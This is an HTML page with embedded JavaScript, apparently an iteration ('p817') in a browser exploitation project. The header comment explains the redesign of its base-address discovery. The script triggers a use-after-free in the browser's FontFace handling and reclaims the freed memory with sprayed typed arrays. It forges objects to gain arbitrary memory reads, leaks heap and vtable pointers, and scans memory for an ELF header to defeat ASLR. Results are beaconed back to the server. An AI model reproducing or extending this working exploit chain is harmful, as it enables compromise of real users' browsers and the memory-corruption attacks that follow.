<!--
  p817: magic-bearing base discovery — fixes the p807 overclaim class

  p807 claimed RVA = 0x724DB28, retracted 2026-11-10 (cobrajet302gt, PRs
  #243/#244): both terminal branches bypassed the probe's own ELF-magic
  discriminator:
    - BASE-LOOP-BREAK declared base from a crash-death heuristic, never read
      the candidate page, never checked magic.
    - BASE-NO-ELF-BUT-MAPPED declared base after 5 no-magic reads UP from
      lastOk — "mapped" was treated as sufficient, magic optional.
  Plus SCAN-ALREADY-DONE replay-guard: a polluted /p807state could end the
  probe with zero fresh-boot evidence.

  p817 design (pre-registered fix, EXPLOITATION_STATUS.md:119):
    1. Base is declared ONLY at a page whose first 4 bytes read
       7f 45 4c 46 (ELF magic). There is NO fallback branch that declares
       a base without magic. If magic is never found, the probe grades V
       and says so — it cannot silently upgrade to [I].
    2. The scan walks DOWN from VP through the readable mapping in
       FINE_STEP (0x4000) strides — the same linear page walk p807's
       base-fine used, but every page's first 8 bytes are beaconed
       (SCAN-n-addr-data=), so the committed corpus carries per-page
       evidence instead of only the terminal claim.
    3. The terminal page gets a FULL 16-byte beacon + e_type/e_machine
       parse (HIT-MAGIC line) — the "magic-bearing capture" the regrade
       demanded.
    4. Cross-check: after HIT, the probe reads the 4 RDV rodata RVAs
       validated by p809v25e37 (0x6FA5A5C / 0x6FB1E17 / 0x7274300 /
       0x7277138) relative to the CANDIDATE base and beacons ok/fail per
       RVA (XCHK-). Base grade is M only if magic AND >=3/4 cross-checks
       pass; otherwise I with the failure explicit in the beacon.
    5. No replay-echo: server state is used ONLY to translate deltas for
       crash recovery (as in p807), never to skip the scan. There is no
       'done' short-circuit. Each boot re-walks and re-verifies.
    6. Guard-width pinning: the first crash page below the last readable
       page is recorded (GUARD-lo= / GUARD-hi=) so the bottom-of-mapping
       margin is measured, not assumed.

  Scan budget: VP-to-base distance measured by p807's retracted claim was
  0x724DB28 (~114 MB). At 0x4000 stride that is ~18.3K reads worst case.
  Each read = restoreAndForge + readStyle + restoreAll (synchronous, the
  p807-proven-safe pattern). MAX_PAGES default 20480 covers it with ~12%
  headroom; override with ?maxpages=.

  Crash recovery: identical ARMDELTA/OKDELTA server-delta protocol as
  p807 — a crash mid-scan is resumed on next boot from the translated
  delta, and the crash page itself is the guard measurement (rule 6).

  CRASH_CLASS: HIGH (linear page walk to the bottom of the mapping;
  the terminal page below the mapping WILL fault — that fault is the
  guard measurement and is expected, server state recovers it)
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p817 magic base-discovery</title></head>
<body>
<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">RUNNING</div>
<pre id="out">p817</pre>
<script>
'use strict';
var SKIPJ=-1;
var O=document.getElementById('out');
var UID=Math.random().toString(36).slice(2,8).toUpperCase();

/* --- beacon infrastructure --- */
function b(m){try{O.textContent+='\n'+m;}catch(e){}
  try{var u=location.protocol+'//'+location.host+'/beacon/P817-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID;if(navigator.sendBeacon&&navigator.sendBeacon(u))return;}catch(e){}
  try{new Image().src=location.protocol+'//'+location.host+'/beacon/P817-'+encodeURIComponent(m)+'?t='+Date.now();}catch(e){}}
function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P817-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m+'-XLOST');}catch(e2){}}}
function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}

/* --- server state (crash recovery ONLY — never a done short-circuit) --- */
function getState(){
  try{var x=new XMLHttpRequest();x.open('GET','/p807state',false);x.send(null);
    if(x.status===200)return JSON.parse(x.responseText);
  }catch(e){}
  return null;
}

/* --- query params --- */
function qint(n,d){var m=new RegExp('[?&]'+n+'=([^&]*)').exec(location.search);return m?parseInt(m[1],10):d;}
var K=qint('k',32), PW=qint('pw',80);
var SI=qint('si',0);
var CTL=qint('ctl',0);
var FINE_STEP=0x4000;
var MAX_PAGES=qint('maxpages',20480);

var SIZE=192, fired=false, faces=null;

/* --- primitives --- */
function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
function hex(x){return '0x'+x.toString(16);}

/* --- spray + UAF trigger (identical to p691/p807/p809) --- */
function start(){
  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
  try{document.fonts.add(vf);}catch(e){}
  try{void vf.loaded;}catch(e){}
  var fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);

  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired)return undefined;fired=true;
    if(!CTL){try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}}
    try{document.body.offsetHeight;}catch(e){}
    window.__sp=[];
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SIZE));
      w[0x82]=3;
      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});

  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
                                               function(e){b('RJ-'+String(e&&e.name));});
  setTimeout(function(){if(!faces)b('NOFACES');},1500);
}

/* --- main analysis chain --- */
function phase(){
  var bufs=[],bufl1=[],L1=0n,L2=0n,rawL=null;

  /* Step 1: hit detection + leak L1/L2 */
  for(var i=0;i<window.__sp.length;i++){
    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);bufl1.push(a);if(!rawL)rawL=[a,c];}
  }
  if(rawL){L1=rawL[0];L2=rawL[1];}
  b('L1-'+hex(L1));b('L2-'+hex(L2));
  if(!bufs.length||L2===0n){b('NOLEAK');verd('bad','NOLEAK');return;}

  /* Step 2: initial forge */
  for(var ib=0;ib<bufs.length;ib++){var vb=bufs[ib][0];vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;}
  b('FORGED-'+bufs.length);

  /* Step 3: re-add faces, find oracle face */
  setTimeout(function(){
    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
    b('FAMILY-OK');
    setTimeout(function(){
      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
      b('ADD-OK');
      setTimeout(function(){
        var fam=null,zi=-1;
        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;zi=q;window.__zi=q;break;}}
        b('INTABLE-'+fam);
        if(!fam){b('NOTIN');verd('bad','NOTIN');return;}

        for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=1;bufs[is2][0][0x2C]=1;}

        /* --- oracle functions --- */
        var self=0n,selfFound=false;

        function setR(t){for(var ir=0;ir<bufs.length;ir++){if(SKIPJ>=0&&bufs[ir][0]===window.__sp[SKIPJ])continue;put64(bufs[ir][0],0x20,t);}}
        function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c))===false;}catch(e){return null;}}
        function boundary(tgt){
          setR(tgt);
          /* chk() is negated (true = uncovered), so the largest covered c is the
             largest chk(c)===false = the TO word. No chk(0) pre-gate. */var lo=0,hi=0x10FFFF,res=-1;
          while(lo<=hi){var mid=(lo+hi)>>1;var r=chk(mid);if(r===null)break;if(r===false){res=mid;lo=mid+1;}else hi=mid-1;}
          return res;
        }

        /* --- style-read mechanism (from p691/p807) --- */
        function forgeRead(daddr,dlen){
          for(var ib2=0;ib2<window.__sp.length;ib2++){
            var vb2=window.__sp[ib2];if(!vb2)continue;
            if(SKIPJ>=0&&ib2===SKIPJ)continue;
            if(selfFound){put64(vb2,0x08,self+0x70n);vb2[0x10]=0;}
            put32(vb2,0x30,4);put32(vb2,0x34,dlen);put64(vb2,0x38,daddr);put32(vb2,0x40,4);
            vb2[0x44]=0x7A;vb2[0x45]=0x7A;vb2[0x46]=0x71;
            put32(vb2,0x70,4);
            put32(vb2,0x74,0x10);vb2[0x78]=14;vb2[0x79]=0;
            if(selfFound)put64(vb2,0x7A,self+0x90n);
            put32(vb2,0x90,3);put32(vb2,0x94,72);
            if(selfFound)put64(vb2,0x98,self+0x30n);
          }
        }
        function dec(s,lim){
          var by=[],q2=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q2;
          while(k<e&&by.length<lim){var ch=s.charAt(k);
            if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
              if(hh.length===0){if(k<e){by.push(s.charCodeAt(k));k++;}}
              else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
            else{by.push(s.charCodeAt(k));k++;}}
          var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
        }
        function readStyle(){
          if(zi<0)return '';
          try{return dec(String(faces[zi].style),128);}catch(e){return 'THROW';}
        }
        function readLeHex(hexStr,off){
          var s=hexStr.slice(off*2,off*2+16);
          if(!/^[0-9a-f]{16}$/.test(s))return 0n;
          return BigInt('0x'+s.match(/../g).reverse().join(''));
        }
        function restoreAll(snap){
          for(var ib3=0;ib3<window.__sp.length;ib3++){
            var vb3=window.__sp[ib3];if(!vb3)continue;
            if(SKIPJ>=0&&ib3===SKIPJ)continue;
            for(var dd2=0;dd2<SIZE;dd2++)vb3[dd2]=snap[dd2];
          }
        }
        function restoreAndForge(snap,daddr,dlen){
          restoreAll(snap);
          forgeRead(daddr,dlen);
        }

        /* --- Step 4: oracle validation --- */
        var t1=-1,l2i=-1;
        b('DIAG-bufs='+bufs.length+',fam='+fam+',zi='+zi);
        for(var q8=0;q8<bufs.length;q8++){
          L1=bufl1[q8];L2=bufs[q8][1];
          setR(L2+0x07n);
          t1=boundary(L2+0x07n);
          if(t1>=0){l2i=q8;break;}
        }
        if(l2i<0){L1=bufl1[0];L2=bufs[0][1];}

        var oracleAlive=(t1>=0);
        if(!oracleAlive){
          b('A-DEAD');
          for(var ipd=0;ipd<bufs.length;ipd++){var vpd=bufs[ipd][0];
            vpd[0x38]=0x00;vpd[0x39]=0x10;vpd[0x3A]=0x00;vpd[0x3B]=0x00;
            vpd[0x3C]=0x00;vpd[0x3D]=0x20;vpd[0x3E]=0x00;vpd[0x3F]=0x00;}
        }

        /* --- Step 5: Self scan (from p807) --- */
        if(!selfFound){
          var tB2=Number((L1>>16n)&0xFFn), wB2=Number((L2>>16n)&0xFFn);
          var b2Ref=Math.min(tB2,wB2);
          var b4Ref=0x10;
          var B4s=[b4Ref];
          var b4all=[0x10,0x08];
          for(var q8b=0x09;q8b<=0x0F;q8b++)b4all.push(q8b);
          for(var q9=0x11;q9<=0x1F;q9++)b4all.push(q9);
          for(var qw=0;qw<b4all.length;qw++){if(b4all[qw]!==b4Ref)B4s.push(b4all[qw]);}

          var hotB2=[];for(var hh=0x20;hh<=0x40;hh++)hotB2.push(hh);
          hotB2.sort(function(x,y){return Math.abs(x-0x30)-Math.abs(y-0x30);});
          var coldB2=[];for(var q5=0;q5<256;q5++){if(q5<0x20||q5>0x40)coldB2.push(q5);}
          coldB2.sort(function(x,y){var da=Math.abs(x-b2Ref),db=Math.abs(y-b2Ref);
            if(da!==db)return da-db;return(x>=b2Ref?0:1)-(y>=b2Ref?0:1);});
          var b2s=hotB2.concat(coldB2);
          var b0a=[];for(var q6=0;q6<16;q6++)b0a.push(q6*16);

          var n3=0;
          b('PH3-START-b4=0x'+B4s[0].toString(16)+'-b2=0x'+b2Ref.toString(16));

          for(var i8=0;i8<B4s.length&&!selfFound;i8++){
            for(var i7=0;i7<b2s.length&&!selfFound;i7++){
              for(var q7=0;q7<0x100&&!selfFound;q7++){
                for(var i6=0;i6<b0a.length&&!selfFound;i6++){
                  var sc=BigInt(b0a[i6])|(BigInt(q7)<<8n)|(BigInt(b2s[i7])<<16n)|(BigInt(B4s[i8])<<32n);
                  setR(sc+0x38n);n3++;
                  if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
                    self=sc;selfFound=true;
                  }
                  if((n3%16384)===0)b('PH3-'+n3);
                }
              }
            }
          }
        }

        if(!selfFound){b('NOSELF');verd('bad','NOSELF');return;}
        b('SELF-0x'+self.toString(16));

        /* --- Step 6: VTAB search (from p691/p807) --- */
        var VTAB=0n;
        for(var sv=1;sv<=256&&VTAB===0n;sv++){
          var cd=self-BigInt(sv*64);
          setR(cd);
          if(chk(0x1000)===true&&chk(0x1001)===false){
            var jj=Number(boundary(cd))-0x1000;
            if(jj>=0&&jj<K){VTAB=cd;SKIPJ=jj;b('VTAB-0x'+cd.toString(16)+'-j'+jj);break;}
          }
        }
        if(VTAB===0n){
          for(var sv2=1;sv2<=256&&VTAB===0n;sv2++){
            var cu=self+BigInt(sv2*64);
            setR(cu);
            if(chk(0x1000)===true&&chk(0x1001)===false){
              var jj2=Number(boundary(cu))-0x1000;
              if(jj2>=0&&jj2<K){VTAB=cu;SKIPJ=jj2;b('VTAB-0x'+cu.toString(16)+'-j'+jj2);break;}
            }
          }
        }
        if(VTAB===0n)b('VTAB-NONE');

        /* --- Step 7: delete all faces before forgeRead phase --- */
        bs('DEL-PRE-FORGE');
        for(var id=0;id<faces.length;id++){try{document.fonts.delete(faces[id]);}catch(e){}}
        bs('DEL-OK');

        /* --- Step 8: immediate hash table read --- */
        var cachedHT='';
        var preSnap=new Uint8Array(SIZE);
        if(bufs.length>0)for(var ps0=0;ps0<SIZE;ps0++)preSnap[ps0]=bufs[0][0][ps0];
        forgeRead(L1-0x10n,80);
        try{cachedHT=dec(String(faces[zi].style),128);bs('IHT-ok-'+cachedHT.length);}catch(e){bs('IHT-err');}
        for(var pr0=0;pr0<window.__sp.length;pr0++){var prv=window.__sp[pr0];if(!prv)continue;if(SKIPJ>=0&&pr0===SKIPJ)continue;for(var pr1=0;pr1<SIZE;pr1++)prv[pr1]=preSnap[pr1];}

        /* --- Step 9: SYNCHRONOUS walk chain (from p691/p807) --- */
        var snap2=preSnap;
        var hw='',h2='',h3='',h4='';
        var IM=0n,FO=0n,VP=0n;
        var S0=0n,S1=0n,S2=0n,S3=0n,Q4=0n,R5=0n,R6=0n,R7=0n,S8=0n;
        var walkOK=false;

        if(cachedHT.length>=160){
          hw=cachedHT;
          var seen=0;
          for(var gb=2;gb<10;gb++){
            var hb=hw.slice(gb*16,gb*16+16);
            if(/^[0-9a-f]{16}$/.test(hb)){
              var cv=BigInt('0x'+hb.match(/../g).reverse().join(''));
              if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){if(seen===SI){IM=cv;break;}seen++;}
            }
          }

          if(IM!==0n){
            restoreAndForge(snap2,IM+8n,16);
            h2=readStyle();
            var hf=h2.slice(0,16);
            if(/^[0-9a-f]{16}$/.test(hf)){
              FO=BigInt('0x'+hf.match(/../g).reverse().join(''));
            }

            if(FO>0x1000000000n){
              restoreAndForge(snap2,FO,32);
              h3=readStyle();
              var hv=h3.slice(0,16),hz=h3.slice(32,48);
              if(/^[0-9a-f]{16}$/.test(hv)){
                VP=BigInt('0x'+hv.match(/../g).reverse().join(''));
              }
              if(/^[0-9a-f]{16}$/.test(hz)){
                var bk=BigInt('0x'+hz.match(/../g).reverse().join(''));
                if(bk>0x1000000000n&&bk<0x10000000000n){self=bk;selfFound=true;}
              }

              if(VP>0x100000000n){
                restoreAll(snap2);
                bs('W3-MID');
                restoreAndForge(snap2,VP,72);
                h4=dec(String(faces[zi].style),128);
                if(h4.length>=128){
                  S0=readLeHex(h4,0);S1=readLeHex(h4,8);S2=readLeHex(h4,16);
                  S3=readLeHex(h4,24);Q4=readLeHex(h4,32);R5=readLeHex(h4,40);
                  R6=readLeHex(h4,48);R7=readLeHex(h4,56);S8=readLeHex(h4,64);
                  walkOK=true;
                }
              }
            }
          }
        }

        restoreAll(snap2);

        bs('WALK-IM='+hex(IM)+',FO='+hex(FO)+',VP='+hex(VP));
        bs('WALK-ok='+walkOK);
        if(VP>0n){
          bs('VT-s0='+hex(S0)+',s1='+hex(S1)+',s2='+hex(S2));
          bs('VT-s3='+hex(S3)+',s4='+hex(Q4)+',s5='+hex(R5));
          bs('VT-s6='+hex(R6)+',s7='+hex(R7)+',s8='+hex(S8));
        }

        if(!walkOK){
          bs('WALK-FAIL');
          verd('bad','WALK FAIL IM='+hex(IM)+' FO='+hex(FO)+' VP='+hex(VP));
          return;
        }

        /* ================================================================
           MAGIC BASE SCAN — the p807 replacement.

           Invariants that did not hold in p807 and MUST hold here:
           (a) A base is emitted only on the HIT-MAGIC path.
           (b) Every page read in the linear walk is beaconed with its
               first 8 bytes, so the corpus shows the scan actually ran.
           (c) The first unreadable page is recorded as the guard pair.
           (d) Server state resumes deltas after a crash; it cannot end
               the probe early.
           ================================================================ */

        /* Resume point from a previous crash (deltas are VP-relative,
           constant across ASLR slides). NOTE: 'done' state is explicitly
           IGNORED — a polluted server cannot short-circuit this probe. */
        var st=getState();
        var resume=0n;
        if(st&&st.died&&st.armDelta){
          resume=BigInt(st.armDelta);
          bs('RESUME-died-delta='+hex(resume));
        } else if(st&&st.okDelta){
          var od=BigInt(st.okDelta);
          if(od>0n)resume=od;
          bs('RESUME-ok-delta='+hex(resume));
        }
        if(st&&st.done){
          bs('RESUME-IGNORED-stale-done');
        }

        /* Linear downward walk from VP. stride = FINE_STEP. */
        var startAddr=(resume>0n)?(VP-resume):(VP&~0x3FFFn);
        bs('SCAN-START-vp='+hex(VP)+',from='+hex(startAddr)+',stride=0x'+FINE_STEP.toString(16)+',maxpages='+MAX_PAGES);

        var lastReadable=0n;
        var guardLo=0n, guardHi=0n;
        var hitBase=0n;
        var nScan=0;

        function doMagicScan(){
          for(;;){
            var addr=(startAddr-BigInt(nScan)*BigInt(FINE_STEP))&~0x3FFFn;

            if(addr<=0x100000000n||addr>0x10000000000n){
              bs('SCAN-OUT-OF-RANGE-'+hex(addr));
              verd('bad','SCAN OUT OF RANGE '+hex(addr));
              return;
            }
            if(VP-addr>0x20000000n){
              bs('SCAN-TOO-FAR-'+hex(VP-addr));
              bs('VERDICT-V-no-base-within-512MB');
              verd('bad','V: no magic within 512MB of VP ('+nScan+' pages)');
              return;
            }

            /* ARM for crash recovery (VP-relative delta) */
            bs('ARMDELTA-'+hex(VP-addr));

            restoreAndForge(snap2,addr,16);
            var rd='';
            try{rd=readStyle();}catch(e){rd='THROW';}
            restoreAll(snap2);

            var readable=(rd!=='THROW'&&rd.length>=2);
            var isElf=readable&&(rd.length>=8&&rd.slice(0,8)==='7f454c46');

            /* Per-page evidence beacon — every readable page's first 8
               bytes land in the corpus. This is what p807 never had. */
            if(readable){
              bs('SCAN-'+nScan+'-addr='+hex(addr)+'-data='+rd.slice(0,16));
              lastReadable=addr;
            }else{
              bs('SCAN-'+nScan+'-addr='+hex(addr)+'-UNREADABLE');
              /* First unreadable page after readable ones = guard pair */
              if(lastReadable>0n&&guardLo===0n){
                guardLo=addr;
                guardHi=lastReadable;
                bs('GUARD-lo='+hex(guardLo)+',hi='+hex(guardHi));
              }
            }

            if(isElf){
              hitBase=addr;
              bs('HIT-MAGIC-addr='+hex(addr));
              bs('HIT-MAGIC-full16='+rd.slice(0,32));
              /* e_type (offset 16) + e_machine (offset 18) parse.
                 readStyle caps at 16 bytes (dlen=16), so rd is 32 hex
                 chars — offsets 16..19 are NOT in this read. Fetch them
                 with a second forge read at addr+16. */
              restoreAndForge(snap2,addr+16n,16);
              var rd2='';
              try{rd2=readStyle();}catch(e){rd2='';}
              restoreAll(snap2);
              /* dec() mangles raw bytes 0x00-0x1F (they come back as JS
                 escapes, not \xx hex). Parse etype/emachine from the RAW
                 first-qword instead: readLeHex gives the true little-endian
                 qword at addr+16; etype = bits 0-15, emachine = bits 16-31. */
              var etype=NaN,emach=NaN;
              if(rd2.length>=16){
                var eh=readLeHex(rd2,0);
                etype=Number(eh&0xFFFFn);
                emach=Number((eh>>16n)&0xFFFFn);
              }
              bs('HIT-MAGIC-etype=0x'+etype.toString(16)+',emachine=0x'+emach.toString(16));
              break;
            }

            nScan++;
            if(nScan>=MAX_PAGES){
              bs('SCAN-MAX-REACHED-'+nScan);
              bs('VERDICT-V-no-magic-in-budget');
              verd('bad','V: no ELF magic in '+MAX_PAGES+' pages from VP');
              return;
            }
          }

          /* --- Cross-check: 4 RDV rodata RVAs from p809v25e37 --- */
          var RVA_CANDIDATE=VP-hitBase;
          bs('RVA-CANDIDATE='+hex(RVA_CANDIDATE));
          var RD_RVAS=[0x6FA5A5Cn,0x6FB1E17n,0x7274300n,0x7277138n];
          var xOk=0,xFail=0;
          for(var xi=0;xi<RD_RVAS.length;xi++){
            var xAddr=hitBase+RD_RVAS[xi];
            restoreAndForge(snap2,xAddr,16);
            var xrd='';
            try{xrd=readStyle();}catch(e){xrd='THROW';}
            restoreAll(snap2);
            var xq0=0n,xq1=0n;
            if(xrd.length>=32){xq0=readLeHex(xrd,0);xq1=readLeHex(xrd,8);}
            var xnz=(xq0!==0n||xq1!==0n);
            if(xnz)xOk++;else xFail++;
            bs('XCHK-'+xi+':rva='+hex(RD_RVAS[xi])+',q0='+hex(xq0)+',q1='+hex(xq1)+',ok='+xnz);
          }

          var grade=(xOk>=3)?'M':((xOk>=1)?'I':'V');
          bs('XCHK-DONE:ok='+xOk+',fail='+xFail+',grade='+grade);
          bs('GUARD-FINAL-lo='+hex(guardLo)+',hi='+hex(guardHi));
          bs('BASE-'+hex(hitBase));
          bs('VP-'+hex(VP));
          bs('RVA-'+hex(RVA_CANDIDATE));
          bs('PHASE-done-grade-'+grade);
          if(grade==='M'){
            verd('ok','BASE='+hex(hitBase)+'<br>VP='+hex(VP)+'<br>RVA='+hex(RVA_CANDIDATE)+'<br>grade M (magic + '+xOk+'/4 xchk)');
          }else{
            verd('bad','BASE candidate '+hex(hitBase)+' grade '+grade+' — magic OK but cross-check weak ('+xOk+'/4). RVA NOT confirmed.');
          }
          return;
        }

        /* Synchronous start — no event-loop gap for CSS/GC */
        doMagicScan();

      },60); /* post ADD-OK */
    },40); /* post FAMILY-OK */
  },60); /* post FORGED */
}

if(document.readyState==='complete'||document.readyState==='interactive')
  setTimeout(function(){setTimeout(start,qint('dl',0));},0);
else document.addEventListener('DOMContentLoaded',function(){setTimeout(start,qint('dl',0));});
</script></body></html>
